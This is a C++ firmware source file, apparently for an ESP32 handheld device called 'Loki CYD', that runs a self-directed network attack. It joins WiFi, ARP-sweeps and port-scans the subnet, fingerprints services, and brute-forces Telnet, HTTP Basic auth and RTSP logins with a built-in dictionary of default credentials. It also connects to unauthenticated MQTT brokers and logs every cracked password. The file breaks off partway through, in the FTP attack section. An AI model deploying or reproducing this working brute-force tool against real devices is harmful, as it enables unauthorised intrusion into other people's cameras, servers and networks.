// =============================================================================
// Loki CYD — Autonomous Recon Engine
// Full attack pipeline: Discover → Identify → Attack → Report
// Ported from HaleHound-CYD IoT Recon module
// Runs on Core 0, reports to pet UI on Core 1
// =============================================================================

#include "loki_recon.h"
#include "loki_config.h"
#include "loki_types.h"
#include "loki_pet.h"
#include "loki_score.h"
#include "loki_sprites.h"
#include <WiFi.h>
#include <WiFiClient.h>
#include <SD.h>
#include <SPI.h>
#include "lwip/inet.h"
#include "lwip/netdb.h"
#include "lwip/sockets.h"
#include "lwip/etharp.h"
#include "lwip/netif.h"
#include "lwip/ip4_addr.h"
#include <libssh/libssh.h>

namespace LokiRecon {

// =============================================================================
// CREDENTIAL DICTIONARY (PROGMEM)
// =============================================================================

// Loki dictionary — cross-product of usernames × passwords (11 × 20 = 220 combos)
static const char* userList[] PROGMEM = {
    "admin", "root", "user", "guest", "test",
    "ftp", "anonymous", "Administrator", "pi", "ubuntu", "kali"
};
static const int USER_COUNT = 11;

static const char* passList[] PROGMEM = {
    "admin", "password", "123456", "root", "guest",
    "test", "1234", "12345", "password123", "admin123",
    "changeme", "letmein", "welcome", "qwerty", "abc123",
    "raspberry", "kali", "toor", "ubuntu", "alpine"
};
static const int PASS_COUNT = 20;

// Also try blank password and same-as-username
static const int CRED_COUNT = USER_COUNT * PASS_COUNT + USER_COUNT * 2; // + blank + same-as-user

struct CredPair {
    const char* user;
    const char* pass;
};

// SD card wordlist
#define MAX_SD_CREDS 64
struct SdCred {
    char user[LOKI_MAX_CRED_USER];
    char pass[LOKI_MAX_CRED_PASS];
};
static SdCred sdCreds[MAX_SD_CREDS];
static int sdCredCount = 0;
static int totalCredCount = 0;

static void getCred(int index, const char*& user, const char*& pass) {
    if (index < USER_COUNT) {
        // First: try each user with blank password
        user = userList[index];
        pass = "";
    } else if (index < USER_COUNT * 2) {
        // Next: try each user with same-as-username password
        int i = index - USER_COUNT;
        user = userList[i];
        pass = userList[i];
    } else if (index < USER_COUNT * 2 + USER_COUNT * PASS_COUNT) {
        // Cross-product: every user × every password
        int i = index - USER_COUNT * 2;
        user = userList[i / PASS_COUNT];
        pass = passList[i % PASS_COUNT];
    } else {
        // SD card extras
        int si = index - CRED_COUNT;
        if (si >= 0 && si < sdCredCount) {
            user = sdCreds[si].user;
            pass = sdCreds[si].pass;
        } else {
            user = "admin";
            pass = "admin";
        }
    }
}

// =============================================================================
// HELPERS
// =============================================================================

static const char b64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static void base64Encode(const char* input, int len, char* output, int outMax) {
    int i = 0, j = 0;
    uint8_t a3[3], a4[4];
    while (len--) {
        a3[i++] = *(input++);
        if (i == 3) {
            a4[0] = (a3[0] & 0xfc) >> 2;
            a4[1] = ((a3[0] & 0x03) << 4) + ((a3[1] & 0xf0) >> 4);
            a4[2] = ((a3[1] & 0x0f) << 2) + ((a3[2] & 0xc0) >> 6);
            a4[3] = a3[2] & 0x3f;
            for (i = 0; i < 4 && j < outMax - 1; i++)
                output[j++] = b64chars[a4[i]];
            i = 0;
        }
    }
    if (i) {
        for (int k = i; k < 3; k++) a3[k] = '\0';
        a4[0] = (a3[0] & 0xfc) >> 2;
        a4[1] = ((a3[0] & 0x03) << 4) + ((a3[1] & 0xf0) >> 4);
        a4[2] = ((a3[1] & 0x0f) << 2) + ((a3[2] & 0xc0) >> 6);
        for (int k = 0; k < i + 1 && j < outMax - 1; k++)
            output[j++] = b64chars[a4[k]];
        while (i++ < 3 && j < outMax - 1)
            output[j++] = '=';
    }
    output[j] = '\0';
}

static void ipToStr(const uint8_t* ip, char* buf, int bufLen) {
    snprintf(buf, bufLen, "%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3]);
}

// =============================================================================
// STATE
// =============================================================================

static LokiDevice devices[LOKI_MAX_DEVICES];
static volatile int deviceCount = 0;
static volatile LokiScanPhase scanPhase = PHASE_IDLE;
static volatile bool running = false;
static volatile bool done = false;
static TaskHandle_t scanTaskHandle = NULL;

static char ssid[33] = {0};
static char pass[65] = {0};

static volatile uint32_t hostsFound = 0;
static volatile uint32_t portsFound = 0;
static volatile uint32_t servicesCracked = 0;
static volatile uint32_t filesStolen = 0;
static volatile uint32_t vulnsFound = 0;

static IPAddress gatewayIP;
static IPAddress localIP;

// Credential log — stores ALL cracked credentials
static LokiCredEntry credLog[LOKI_MAX_CREDS];
static volatile int credLogCount = 0;

static void addCredential(uint8_t* ip, uint16_t port, const char* user, const char* pass) {
    if (credLogCount < LOKI_MAX_CREDS) {
        memcpy(credLog[credLogCount].ip, ip, 4);
        credLog[credLogCount].port = port;
        strncpy(credLog[credLogCount].user, user, LOKI_MAX_CRED_USER - 1);
        strncpy(credLog[credLogCount].pass, pass, LOKI_MAX_CRED_PASS - 1);
        credLogCount++;
    }
    Serial.printf("[CRED] %d.%d.%d.%d:%d  %s : %s\n", ip[0], ip[1], ip[2], ip[3], port, user, pass);
}

// =============================================================================
// SD WORDLIST LOADER
// =============================================================================

static void loadSdWordlist() {
    // SD wordlist loading is optional — skip if no SD to avoid SPI conflicts with WiFi
    sdCredCount = 0;
    totalCredCount = CRED_COUNT;

    if (!LokiSprites::sdAvailable()) return;  // No SD card, use built-in creds only

    SPI.begin(SD_SCK, SD_MISO, SD_MOSI, SD_CS);
    pinMode(SD_CS, OUTPUT);
    digitalWrite(SD_CS, HIGH);

    if (!SD.begin(SD_CS, SPI, 4000000)) {
        SD.end();
        return;
    }

    File f = SD.open("/loki/creds.txt");
    if (!f) {
        SD.end();
        return;
    }

    while (f.available() && sdCredCount < MAX_SD_CREDS) {
        String line = f.readStringUntil('\n');
        line.trim();
        if (line.length() == 0 || line.startsWith("#")) continue;

        int colon = line.indexOf(':');
        if (colon > 0) {
            String u = line.substring(0, colon);
            String p = line.substring(colon + 1);
            strncpy(sdCreds[sdCredCount].user, u.c_str(), LOKI_MAX_CRED_USER - 1);
            strncpy(sdCreds[sdCredCount].pass, p.c_str(), LOKI_MAX_CRED_PASS - 1);
        } else {
            strncpy(sdCreds[sdCredCount].user, "admin", LOKI_MAX_CRED_USER - 1);
            strncpy(sdCreds[sdCredCount].pass, line.c_str(), LOKI_MAX_CRED_PASS - 1);
        }
        sdCredCount++;
    }

    f.close();
    SD.end();
    totalCredCount = CRED_COUNT + sdCredCount;
}

// =============================================================================
// CORE 0: SCAN TASK — Full autonomous pipeline
// =============================================================================

static const uint16_t scanPorts[] = LOKI_SCAN_PORTS;
static const char* portNames[] = {"FTP","SSH","Telnet","HTTP","HTTPS","SMB","MySQL","RDP","HTTP"};

// =============================================================================
// ARP-BASED HOST DISCOVERY (same method as nmap -sn on local networks)
// =============================================================================

static bool isHostInArpTable(IPAddress ipAddr) {
    ip4_addr_t ip;
    IP4_ADDR(&ip, ipAddr[0], ipAddr[1], ipAddr[2], ipAddr[3]);

    struct eth_addr *eth_ret = NULL;
    const ip4_addr_t *ip_ret = NULL;

    int idx = etharp_find_addr(netif_default, &ip, &eth_ret, &ip_ret);
    return (idx >= 0 && eth_ret != NULL);
}

static void sendArpRequest(IPAddress ipAddr) {
    ip4_addr_t ip;
    IP4_ADDR(&ip, ipAddr[0], ipAddr[1], ipAddr[2], ipAddr[3]);
    etharp_request(netif_default, &ip);
}

static void scanTask(void* param) {
    Serial.println("[RECON] Core 0: Scan task started");
    Serial.printf("[RECON] SSID: '%s' Pass: '%s'\n", ssid, strlen(pass) > 0 ? "***" : "(none)");

    // Declare variables early so goto doesn't cross them
    WiFiClient client;
    client.setTimeout(3);

#define LOKI_MAX_ALIVE 254
    uint8_t aliveHosts[LOKI_MAX_ALIVE];
    int aliveCount = 0;

    // Load wordlist BEFORE WiFi to avoid SPI conflicts
    loadSdWordlist();
    {
        char msg[52];
        snprintf(msg, sizeof(msg), "[*] %d credentials armed", totalCredCount);
        LokiPet::addKillLine(msg, LOKI_CYAN);
    }

    // =========================================================================
    // WIFI CONNECT
    // =========================================================================
    scanPhase = PHASE_WIFI_CONNECT;
    LokiPet::setStatus("Connecting WiFi...");
    LokiPet::setMood(MOOD_SCANNING);

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(500);  // Give WiFi time to reset

    Serial.println("[RECON] Connecting to WiFi...");
    if (strlen(pass) > 0) WiFi.begin(ssid, pass);
    else WiFi.begin(ssid);

    unsigned long t0 = millis();
    while (WiFi.status() != WL_CONNECTED && millis() - t0 < 15000) {
        delay(500);
        Serial.printf("[RECON] WiFi status: %d\n", WiFi.status());
        if (!running) goto task_exit;
    }

    if (WiFi.status() != WL_CONNECTED) {
        Serial.printf("[RECON] WiFi FAILED (status: %d)\n", WiFi.status());
        LokiPet::setStatus("WiFi failed!");
        LokiPet::addKillLine("[!] WiFi connection failed", LOKI_RED);
        LokiPet::setMood(MOOD_BORED);
        goto task_exit;
    }

    Serial.printf("[RECON] WiFi connected! IP: %s\n", WiFi.localIP().toString().c_str());

    // Small delay to let WiFi stack stabilize before scanning
    delay(1000);

    gatewayIP = WiFi.gatewayIP();
    localIP = WiFi.localIP();

    {
        char msg[52];
        snprintf(msg, sizeof(msg), "[*] Connected: %s", localIP.toString().c_str());
        LokiPet::addKillLine(msg, LOKI_GREEN);
        LokiPet::setStatus("Connected", localIP.toString().c_str());
    }

    // =========================================================================
    // PHASE 1: DISCOVER — TCP connect scan
    // =========================================================================
    scanPhase = PHASE_DISCOVER;
    LokiPet::setStatus("NetworkScanner", "Discovering hosts...");
    LokiPet::addKillLine("[>] Host discovery started", LOKI_CYAN);

    // ── PHASE 1a: ARP SCAN — discover ALL alive hosts (like nmap -sn) ──
    // ARP table set to 255 entries so all hosts fit at once.
    LokiPet::addKillLine("[>] ARP scan...", LOKI_CYAN);
    aliveCount = 0;

    // Send ARP requests for entire subnet
    for (int host = 1; host <= 254 && running; host++) {
        IPAddress ip(gatewayIP[0], gatewayIP[1], gatewayIP[2], host);
        sendArpRequest(ip);
        if (host % 20 == 0) vTaskDelay(pdMS_TO_TICKS(10));
    }

    // Wait for all ARP replies
    LokiPet::addKillLine("[>] Waiting for ARP replies...", LOKI_TEXT_DIM);
    vTaskDelay(pdMS_TO_TICKS(3000));

    // Check ARP table for all hosts
    for (int host = 1; host <= 254 && running; host++) {
        IPAddress ip(gatewayIP[0], gatewayIP[1], gatewayIP[2], host);
        if (ip == localIP) continue;

        if (isHostInArpTable(ip)) {
            if (aliveCount < LOKI_MAX_ALIVE) {
                aliveHosts[aliveCount++] = host;
            }
            hostsFound++;
            LokiScoreManager::addHostFound();
            char msg[52];
            snprintf(msg, sizeof(msg), "[+] ALIVE %d.%d.%d.%d", gatewayIP[0], gatewayIP[1], gatewayIP[2], host);
            LokiPet::addKillLine(msg, LOKI_BRIGHT);
        }
    }

    {
        char msg[52];
        snprintf(msg, sizeof(msg), "[*] %d hosts alive", aliveCount);
        LokiPet::addKillLine(msg, LOKI_GREEN);
    LokiPet::setStatus("NetworkScanner", "Port scanning...");    }

    if (!running) goto task_exit;

    // ── PHASE 1b: PORT SCAN — scan only alive hosts ──
    LokiPet::addKillLine("[>] Port scanning alive hosts...", LOKI_CYAN);
    LokiPet::setStatus("NetworkScanner");

    for (int a = 0; a < aliveCount && running; a++) {
        int host = aliveHosts[a];
        IPAddress ip(gatewayIP[0], gatewayIP[1], gatewayIP[2], host);

        uint16_t portMask = 0;

        // Scan all target ports on this alive host
        for (int p = 0; p < LOKI_MAX_PORTS && running; p++) {
            if (client.connect(ip, scanPorts[p], 500)) {
                portMask |= (1 << p);
                client.stop();
            }
        }

        // Register host (even with no target ports open — it's still alive)
        if (deviceCount < LOKI_MAX_DEVICES) {
            int idx = deviceCount;
            devices[idx].ip[0] = ip[0]; devices[idx].ip[1] = ip[1];
            devices[idx].ip[2] = ip[2]; devices[idx].ip[3] = ip[3];
            devices[idx].openPorts = portMask;
            devices[idx].type = DEV_UNKNOWN;
            devices[idx].status = STATUS_FOUND;
            devices[idx].banner[0] = '\0';
            devices[idx].credUser[0] = '\0';
            devices[idx].credPass[0] = '\0';
            devices[idx].crackedPorts = 0;
            deviceCount++;
            hostsFound++;
            LokiScoreManager::addHostFound();

            int portCount = 0;
            for (int p = 0; p < LOKI_MAX_PORTS; p++) {
                if (portMask & (1 << p)) { portCount++; portsFound++; LokiScoreManager::addPortFound(); }
            }

            char msg[52], ipStr[16];
            ipToStr(devices[idx].ip, ipStr, sizeof(ipStr));
            // List open port numbers
            String portList = "";
            for (int p = 0; p < LOKI_MAX_PORTS; p++) {
                if (portMask & (1 << p)) {
                    if (portList.length() > 0) portList += ",";
                    portList += String(scanPorts[p]);
                }
            }
            snprintf(msg, sizeof(msg), "[+] %s :%s", ipStr, portList.c_str());
            LokiPet::addKillLine(msg, LOKI_BRIGHT);
        }
        vTaskDelay(1);
    }

    if (!running) goto task_exit;

    // =========================================================================
    // PHASE 2: IDENTIFY — Banner grab + fingerprint
    // =========================================================================
    scanPhase = PHASE_IDENTIFY;
    LokiPet::setStatus("NetworkScanner");
    LokiPet::addKillLine("[>] Service identification", LOKI_CYAN);

    for (int d = 0; d < deviceCount && running; d++) {
        LokiDevice& dev = devices[d];
        IPAddress devIP(dev.ip[0], dev.ip[1], dev.ip[2], dev.ip[3]);
        char ipStr[16];
        ipToStr(dev.ip, ipStr, sizeof(ipStr));

        // HTTP banner grab
        if ((dev.openPorts & PORT_HTTP) || (dev.openPorts & PORT_HTTP2)) {
            uint16_t port = (dev.openPorts & PORT_HTTP) ? 80 : 8080;
            if (client.connect(devIP, port, 2000)) {
                client.printf("GET / HTTP/1.0\r\nHost: %s\r\nConnection: close\r\n\r\n", ipStr);
                t0 = millis();
                String resp = "";
                while (client.connected() && millis() - t0 < 3000 && resp.length() < 512) {
                    while (client.available() && resp.length() < 512) resp += (char)client.read();
                    vTaskDelay(1);
                }
                client.stop();

                // Extract Server header
                int sIdx = resp.indexOf("Server:");
                if (sIdx >= 0) {
                    int eIdx = resp.indexOf("\r\n", sIdx);
                    if (eIdx > sIdx) {
                        String server = resp.substring(sIdx + 8, min(eIdx, sIdx + 8 + LOKI_MAX_BANNER_LEN - 1));
                        server.trim();
                        strncpy(dev.banner, server.c_str(), LOKI_MAX_BANNER_LEN - 1);
                    }
                }

                // Fingerprint
                String rLow = resp; rLow.toLowerCase();
                if (rLow.indexOf("hikvision") >= 0 || rLow.indexOf("hik") >= 0) {
                    dev.type = DEV_CAMERA; strncpy(dev.banner, "Hikvision", LOKI_MAX_BANNER_LEN);
                } else if (rLow.indexOf("dahua") >= 0) {
                    dev.type = DEV_CAMERA; strncpy(dev.banner, "Dahua", LOKI_MAX_BANNER_LEN);
                } else if (rLow.indexOf("401") >= 0 && false) {
                    dev.type = DEV_CAMERA;
                }
            }
        }

        // RTSP check (port 554)
        if (false && running) {
            if (client.connect(devIP, 554, 2000)) {
                client.printf("OPTIONS rtsp://%s:554 RTSP/1.0\r\nCSeq: 1\r\n\r\n", ipStr);
                t0 = millis();
                String resp = "";
                while (client.connected() && millis() - t0 < 2000 && resp.length() < 256) {
                    while (client.available() && resp.length() < 256) resp += (char)client.read();
                    vTaskDelay(1);
                }
                client.stop();
                if (dev.type == DEV_UNKNOWN) {
                    dev.type = DEV_CAMERA;
                    if (!dev.banner[0]) strncpy(dev.banner, "RTSP Camera", LOKI_MAX_BANNER_LEN);
                }
            }
        }

        // MQTT (port 1883)
        if (false && running) {
            dev.type = DEV_MQTT_BROKER;
            if (!dev.banner[0]) strncpy(dev.banner, "MQTT Broker", LOKI_MAX_BANNER_LEN);
        }

        // Telnet banner (port 23)
        if ((dev.openPorts & PORT_TELNET) && running) {
            if (client.connect(devIP, 23, 2000)) {
                t0 = millis();
                String banner = "";
                while (client.connected() && millis() - t0 < 2000 && banner.length() < 128) {
                    while (client.available() && banner.length() < 128) banner += (char)client.read();
                    vTaskDelay(1);
                }
                client.stop();
                if (dev.type == DEV_UNKNOWN) dev.type = DEV_TELNET;
                if (banner.length() > 0 && !dev.banner[0]) {
                    strncpy(dev.banner, banner.c_str(), LOKI_MAX_BANNER_LEN - 1);
                    for (int c = 0; c < LOKI_MAX_BANNER_LEN && dev.banner[c]; c++)
                        if (dev.banner[c] < 32) dev.banner[c] = ' ';
                }
            }
        }

        // FTP banner (port 21) — bit 8
        if ((dev.openPorts & PORT_FTP) && running) {
            if (client.connect(devIP, 21, 2000)) {
                t0 = millis();
                String banner = "";
                while (client.connected() && millis() - t0 < 2000 && banner.length() < 128) {
                    while (client.available() && banner.length() < 128) banner += (char)client.read();
                    vTaskDelay(1);
                }
                client.stop();
                if (dev.type == DEV_UNKNOWN) dev.type = DEV_FTP;
                if (banner.length() > 0 && !dev.banner[0]) {
                    String clean = banner;
                    if (clean.startsWith("220 ") || clean.startsWith("220-")) clean = clean.substring(4);
                    clean.trim();
                    strncpy(dev.banner, clean.c_str(), LOKI_MAX_BANNER_LEN - 1);
                    for (int c = 0; c < LOKI_MAX_BANNER_LEN && dev.banner[c]; c++)
                        if (dev.banner[c] < 32) dev.banner[c] = ' ';
                }
            }
        }

        // SSH banner (port 22) — SSH takes priority as device type
        if ((dev.openPorts & PORT_SSH) && running) {
            if (client.connect(devIP, 22, 2000)) {
                t0 = millis();
                String banner = "";
                while (client.connected() && millis() - t0 < 2000 && banner.length() < 128) {
                    while (client.available() && banner.length() < 128) banner += (char)client.read();
                    vTaskDelay(1);
                }
                client.stop();
                dev.type = DEV_SSH;  // SSH overrides — best identifier for a host
                if (banner.length() > 0 && !dev.banner[0]) {
                    banner.trim();
                    strncpy(dev.banner, banner.c_str(), LOKI_MAX_BANNER_LEN - 1);
                    for (int c = 0; c < LOKI_MAX_BANNER_LEN && dev.banner[c]; c++)
                        if (dev.banner[c] < 32) dev.banner[c] = ' ';
                }
            }
        }

        // Modbus (port 502)
        if (false && running) {
            dev.type = DEV_MODBUS_PLC;
            if (!dev.banner[0]) strncpy(dev.banner, "Modbus PLC", LOKI_MAX_BANNER_LEN);
        }

        // HTTPS detection
        if ((dev.openPorts & PORT_HTTPS) && dev.type == DEV_UNKNOWN) {
            dev.type = DEV_HTTP;
            if (!dev.banner[0]) strncpy(dev.banner, "HTTPS Device", LOKI_MAX_BANNER_LEN);
        }

        // SMB (port 445) — bit 10
        if ((dev.openPorts & PORT_SMB) && dev.type == DEV_UNKNOWN && running) {
            dev.type = DEV_SMB;
            if (!dev.banner[0]) strncpy(dev.banner, "SMB/CIFS", LOKI_MAX_BANNER_LEN);
        }

        // MySQL (port 3306) — bit 11
        if ((dev.openPorts & PORT_MYSQL) && running) {
            if (dev.type == DEV_UNKNOWN) dev.type = DEV_MYSQL;
            if (client.connect(devIP, 3306, 2000)) {
                t0 = millis();
                String banner = "";
                while (client.connected() && millis() - t0 < 2000 && banner.length() < 128) {
                    while (client.available() && banner.length() < 128) banner += (char)client.read();
                    vTaskDelay(1);
                }
                client.stop();
                if (banner.length() > 4 && !dev.banner[0]) {
                    // MySQL greeting starts with packet length + version string
                    String ver = banner.substring(4);
                    int nullPos = ver.indexOf('\0');
                    if (nullPos > 0) ver = ver.substring(0, nullPos);
                    ver.trim();
                    strncpy(dev.banner, ver.c_str(), LOKI_MAX_BANNER_LEN - 1);
                }
            }
        }

        // RDP (port 3389) — bit 12
        if ((dev.openPorts & PORT_RDP) && dev.type == DEV_UNKNOWN && running) {
            dev.type = DEV_RDP;
            if (!dev.banner[0]) strncpy(dev.banner, "RDP/Remote Desktop", LOKI_MAX_BANNER_LEN);
        }

        // Log identification
        if (dev.type != DEV_UNKNOWN) {
            const char* typeStr = "Device";
            switch (dev.type) {
                case DEV_CAMERA:      typeStr = "Camera"; break;
                case DEV_MQTT_BROKER: typeStr = "MQTT";   break;
                case DEV_TELNET:      typeStr = "Telnet"; break;
                case DEV_MODBUS_PLC:  typeStr = "Modbus"; break;
                case DEV_HTTP:        typeStr = "HTTP";   break;
                case DEV_FTP:         typeStr = "FTP";    break;
                case DEV_SSH:         typeStr = "SSH";    break;
                case DEV_SMB:         typeStr = "SMB";    break;
                case DEV_MYSQL:       typeStr = "MySQL";  break;
                case DEV_RDP:         typeStr = "RDP";    break;
                default: break;
            }
            char msg[52];
            snprintf(msg, sizeof(msg), "[*] %s %s (%s)", typeStr, ipStr, dev.banner);
            LokiPet::addKillLine(msg, LOKI_CYAN);
        }
        vTaskDelay(1);
    }

    if (!running) goto task_exit;

    // =========================================================================
    // PHASE 3: ATTACK — Brute force per device type
    // =========================================================================
    scanPhase = PHASE_ATTACK;
    LokiPet::setStatus("Attacking");
    LokiPet::setMood(MOOD_ATTACKING);
    LokiPet::addKillLine("[>] Brute force started", LOKI_MAGENTA);

    for (int d = 0; d < deviceCount && running; d++) {
        LokiDevice& dev = devices[d];
        IPAddress devIP(dev.ip[0], dev.ip[1], dev.ip[2], dev.ip[3]);
        char ipStr[16];
        ipToStr(dev.ip, ipStr, sizeof(ipStr));

        // ── CAMERA: RTSP brute force ──
        if (dev.type == DEV_CAMERA && false && running) {
            LokiPet::setStatus("RTSPBruteforce", ipStr);
            dev.status = STATUS_TESTING;
            bool cracked = false;
            int connFails = 0;

            LokiPet::addKillLine(("[>] RTSP brute " + String(ipStr)).c_str(), LOKI_CYAN);

            for (int c = 0; c < totalCredCount && running && !cracked; c++) {
                const char* user; const char* pass;
                getCred(c, user, pass);

                if (c > 0 && c % 10 == 0) {
                    char msg[52];
                    snprintf(msg, sizeof(msg), "[>] %s RTSP [%d/%d]", ipStr, c, totalCredCount);
                    LokiPet::addKillLine(msg, LOKI_TEXT_DIM);
                }

                if (client.connect(devIP, 554, 1000)) {
                    connFails = 0;
                    char authPlain[40]; snprintf(authPlain, sizeof(authPlain), "%s:%s", user, pass);
                    char authB64[64]; base64Encode(authPlain, strlen(authPlain), authB64, sizeof(authB64));

                    client.printf("DESCRIBE rtsp://%s:554/ RTSP/1.0\r\nCSeq: 2\r\nAuthorization: Basic %s\r\n\r\n", ipStr, authB64);

                    t0 = millis(); String resp = "";
                    while (client.connected() && millis() - t0 < 2000 && resp.length() < 128) {
                        while (client.available() && resp.length() < 128) resp += (char)client.read();
                        vTaskDelay(1);
                    }
                    client.stop();

                    if (resp.indexOf("200") >= 0) {
                        cracked = true;
                        strncpy(dev.credUser, user, LOKI_MAX_CRED_USER - 1);
                        strncpy(dev.credPass, pass, LOKI_MAX_CRED_PASS - 1);
                        dev.status = STATUS_CRACKED; servicesCracked++;
                        LokiScoreManager::addServiceCracked(); addCredential(dev.ip, 554, user, pass);
                        LokiPet::setMood(MOOD_CRACKED);

                        char msg[52]; snprintf(msg, sizeof(msg), "[!!!] CRACKED %s %s:%s", ipStr, user, pass);
                        LokiPet::addKillLine(msg, LOKI_HOTPINK);
                    }
                } else if (++connFails >= 5) {
                    LokiPet::addKillLine(("[!] " + String(ipStr) + " RTSP blocked").c_str(), LOKI_TEXT_DIM);
                    break;
                }
                vTaskDelay(1);
            }

            // Try HTTP auth if RTSP failed
            if (!cracked && (dev.openPorts & (PORT_HTTP|PORT_HTTP2)) && running) {
                uint16_t port = (dev.openPorts & PORT_HTTP) ? 80 : 8080;
                connFails = 0;

                for (int c = 0; c < totalCredCount && running && !cracked; c++) {
                    const char* user; const char* pass;
                    getCred(c, user, pass);

                    if (client.connect(devIP, port, 1000)) {
                        connFails = 0;
                        char authPlain[40]; snprintf(authPlain, sizeof(authPlain), "%s:%s", user, pass);
                        char authB64[64]; base64Encode(authPlain, strlen(authPlain), authB64, sizeof(authB64));

                        client.printf("GET / HTTP/1.0\r\nHost: %s\r\nAuthorization: Basic %s\r\nConnection: close\r\n\r\n", ipStr, authB64);

                        t0 = millis(); String resp = "";
                        while (client.connected() && millis() - t0 < 2000 && resp.length() < 128) {
                            while (client.available() && resp.length() < 128) resp += (char)client.read();
                            vTaskDelay(1);
                        }
                        client.stop();

                        if (resp.indexOf("200") >= 0 && resp.indexOf("401") < 0) {
                            cracked = true;
                            strncpy(dev.credUser, user, LOKI_MAX_CRED_USER - 1);
                            strncpy(dev.credPass, pass, LOKI_MAX_CRED_PASS - 1);
                            dev.status = STATUS_CRACKED; servicesCracked++;
                            LokiScoreManager::addServiceCracked(); addCredential(dev.ip, 80, user, pass);
                            LokiPet::setMood(MOOD_CRACKED);
                            char msg[52]; snprintf(msg, sizeof(msg), "[!!!] CRACKED %s %s:%s", ipStr, user, pass);
                            LokiPet::addKillLine(msg, LOKI_HOTPINK);
                        }
                    } else if (++connFails >= 5) break;
                    vTaskDelay(1);
                }
            }

            if (!cracked && dev.status == STATUS_TESTING) {
                if (dev.status != STATUS_CRACKED) dev.status = STATUS_LOCKED;
                char msg[52]; snprintf(msg, sizeof(msg), "[x] LOCKED %s camera", ipStr);
                LokiPet::addKillLine(msg, LOKI_TEXT_DIM);
            }
        }

        // ── MQTT: Connect + subscribe ──
        if (dev.type == DEV_MQTT_BROKER && running) {
            LokiPet::setStatus("MQTTProbe", ipStr);
            dev.status = STATUS_TESTING;
            if (client.connect(devIP, 1883, 2000)) {
                uint8_t mqttConnect[] = {
                    0x10, 0x10, 0x00, 0x04, 'M','Q','T','T',
                    0x04, 0x02, 0x00, 0x3C, 0x00, 0x04, 'L','O','K','I'
                };
                client.write(mqttConnect, sizeof(mqttConnect));

                t0 = millis(); bool gotAck = false;
                while (client.connected() && millis() - t0 < 3000) {
                    if (client.available() >= 4) {
                        uint8_t b0 = client.read(), b1 = client.read(), b2 = client.read(), b3 = client.read();
                        if ((b0 & 0xF0) == 0x20 && b3 == 0x00) gotAck = true;
                        break;
                    }
                    vTaskDelay(1);
                }

                if (gotAck) {
                    dev.status = STATUS_OPEN;
                    LokiScoreManager::addServiceCracked();
                    servicesCracked++;
                    char msg[52]; snprintf(msg, sizeof(msg), "[*] OPEN %s MQTT (no auth)", ipStr);
                    LokiPet::addKillLine(msg, LOKI_GREEN);
                    LokiPet::setMood(MOOD_CRACKED);

                    // Subscribe to # and capture topics
                    uint8_t mqttSub[] = {0x82, 0x06, 0x00, 0x01, 0x00, 0x01, '#', 0x00};
                    client.write(mqttSub, sizeof(mqttSub));
                    t0 = millis(); int topics = 0;
                    while (client.connected() && millis() - t0 < 5000 && topics < 50 && running) {
                        if (client.available()) {
                            uint8_t type = client.read();
                            if ((type & 0xF0) == 0x30) topics++;
                            // Drain remaining bytes
                            while (client.available()) client.read();
                        }
                        vTaskDelay(1);
                    }
                    
                } else {
                    if (dev.status != STATUS_CRACKED) dev.status = STATUS_LOCKED;
                }
                client.stop();
            }
        }

        // ── TELNET: Default credential testing ──
        if ((dev.openPorts & PORT_TELNET) && running) {
            LokiPet::setStatus("TelnetBruteforce", ipStr);
            dev.status = STATUS_TESTING;
            bool cracked = false;
            int connFails = 0;

            LokiPet::addKillLine(("[>] Telnet brute " + String(ipStr)).c_str(), LOKI_CYAN);

            for (int c = 0; c < totalCredCount && running && !cracked; c++) {
                const char* user; const char* pass;
                getCred(c, user, pass);

                if (c > 0 && c % 10 == 0) {
                    char msg[52]; snprintf(msg, sizeof(msg), "[>] %s Telnet [%d/%d]", ipStr, c, totalCredCount);
                    LokiPet::addKillLine(msg, LOKI_TEXT_DIM);
                }

                if (client.connect(devIP, 23, 1000)) {
                    connFails = 0;
                    // Wait for login prompt
                    t0 = millis(); String resp = "";
                    while (client.connected() && millis() - t0 < 3000 && resp.length() < 256) {
                        while (client.available()) resp += (char)client.read();
                        String rLow = resp; rLow.toLowerCase();
                        if (rLow.indexOf("login") >= 0 || rLow.indexOf("user") >= 0 || rLow.indexOf(":") >= 0) break;
                        vTaskDelay(pdMS_TO_TICKS(50));
                    }

                    client.printf("%s\r\n", user); delay(500);

                    // Wait for password prompt
                    resp = ""; t0 = millis();
                    while (client.connected() && millis() - t0 < 2000 && resp.length() < 256) {
                        while (client.available()) resp += (char)client.read();
                        String rLow = resp; rLow.toLowerCase();
                        if (rLow.indexOf("pass") >= 0 || rLow.indexOf(":") >= 0) break;
                        vTaskDelay(pdMS_TO_TICKS(50));
                    }

                    client.printf("%s\r\n", pass); delay(1000);

                    // Check for shell
                    resp = ""; t0 = millis();
                    while (client.connected() && millis() - t0 < 2000 && resp.length() < 256) {
                        while (client.available()) resp += (char)client.read();
                        vTaskDelay(pdMS_TO_TICKS(50));
                    }
                    client.stop();

                    String rLow = resp; rLow.toLowerCase();
                    if ((rLow.indexOf("$") >= 0 || rLow.indexOf("#") >= 0 || rLow.indexOf(">") >= 0 ||
                         rLow.indexOf("welcome") >= 0 || rLow.indexOf("busybox") >= 0) &&
                        rLow.indexOf("incorrect") < 0 && rLow.indexOf("denied") < 0 &&
                        rLow.indexOf("failed") < 0 && rLow.indexOf("invalid") < 0) {
                        cracked = true;
                        strncpy(dev.credUser, user, LOKI_MAX_CRED_USER - 1);
                        strncpy(dev.credPass, pass, LOKI_MAX_CRED_PASS - 1);
                        dev.status = STATUS_CRACKED; servicesCracked++;
                        LokiScoreManager::addServiceCracked(); addCredential(dev.ip, 23, user, pass);
                        LokiPet::setMood(MOOD_CRACKED);
                        char msg[52]; snprintf(msg, sizeof(msg), "[!!!] CRACKED %s telnet %s:%s", ipStr, user, pass);
                        LokiPet::addKillLine(msg, LOKI_HOTPINK);
                    }
                } else if (++connFails >= 5) {
                    LokiPet::addKillLine(("[!] " + String(ipStr) + " Telnet blocked").c_str(), LOKI_TEXT_DIM);
                    break;
                }
                vTaskDelay(1);
            }

            if (!cracked && dev.status == STATUS_TESTING) {
                if (dev.status != STATUS_CRACKED) dev.status = STATUS_LOCKED;
                char msg[52]; snprintf(msg, sizeof(msg), "[x] LOCKED %s telnet", ipStr);
                LokiPet::addKillLine(msg, LOKI_TEXT_DIM);
            }
        }

        // ── FTP: Default credential testing (port 21) ──
        if ((dev.openPorts & PORT_FTP) && running) {
